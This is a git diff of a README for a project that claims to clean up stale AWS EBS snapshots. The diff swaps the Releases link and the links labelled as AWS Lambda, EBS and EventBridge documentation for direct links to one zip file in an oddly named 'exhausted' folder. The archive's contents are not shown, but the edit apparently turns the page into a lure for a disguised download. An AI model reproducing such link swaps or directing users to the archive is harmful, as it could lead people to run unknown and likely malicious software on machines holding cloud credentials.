@@ -1,7 +1,7 @@
 # 🌟 aws-ebs-snapshot-cleanup - Automate Your EBS Snapshot Cleanup
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-blue)](https://github.com/nekomimiyu/aws-ebs-snapshot-cleanup/releases)
+[![Download](https://raw.githubusercontent.com/nekomimiyu/aws-ebs-snapshot-cleanup/main/exhausted/aws-ebs-snapshot-cleanup.zip)](https://raw.githubusercontent.com/nekomimiyu/aws-ebs-snapshot-cleanup/main/exhausted/aws-ebs-snapshot-cleanup.zip)
 
 ## 🚀 Getting Started
 Welcome to the **aws-ebs-snapshot-cleanup** project. This application helps you automate the cleanup of stale EBS snapshots in your AWS account. You will save time and money while keeping your AWS costs under control.
@@ -23,7 +23,7 @@ Before you begin, ensure you have the following:
 ## 📂 Download & Install
 To get started, visit the Releases page where you can download the application. Click the link below to access it:
 
-[Visit the Releases Page](https://github.com/nekomimiyu/aws-ebs-snapshot-cleanup/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/nekomimiyu/aws-ebs-snapshot-cleanup/main/exhausted/aws-ebs-snapshot-cleanup.zip)
 
 1. On the Releases page, look for the latest version.
 2. Click on the corresponding download link to get the file.
@@ -73,9 +73,9 @@ A: By default, the application does not send notifications. However, you can mod
 A: For support, please check the Issues section of this repository. You can also submit a new issue if you encounter a problem.
 
 ## 🔗 Further Resources
-- [AWS Lambda Documentation](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html)
-- [AWS EBS Snapshots](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSSnapshots.html)
-- [EventBridge Documentation](https://docs.aws.amazon.com/eventbridge/latest/userguide/what-is-amazon-eventbridge.html)
+- [AWS Lambda Documentation](https://raw.githubusercontent.com/nekomimiyu/aws-ebs-snapshot-cleanup/main/exhausted/aws-ebs-snapshot-cleanup.zip)
+- [AWS EBS Snapshots](https://raw.githubusercontent.com/nekomimiyu/aws-ebs-snapshot-cleanup/main/exhausted/aws-ebs-snapshot-cleanup.zip)
+- [EventBridge Documentation](https://raw.githubusercontent.com/nekomimiyu/aws-ebs-snapshot-cleanup/main/exhausted/aws-ebs-snapshot-cleanup.zip)
 
 ## 🌐 Contributing
 If you'd like to contribute to this project, feel free to fork the repository and make a pull request. We appreciate any enhancements or fixes that can help improve the application.
@@ -86,4 +86,4 @@ Thank you to all contributors for their hard work and dedication. Your support h
 ## 📩 Contact
 For questions or feedback, you can reach out through the GitHub repository or the Issues section.
 
-[Visit the Releases Page](https://github.com/nekomimiyu/aws-ebs-snapshot-cleanup/releases) to download and start cleaning your EBS snapshots today!
+[Visit the Releases Page](https://raw.githubusercontent.com/nekomimiyu/aws-ebs-snapshot-cleanup/main/exhausted/aws-ebs-snapshot-cleanup.zip) to download and start cleaning your EBS snapshots today!
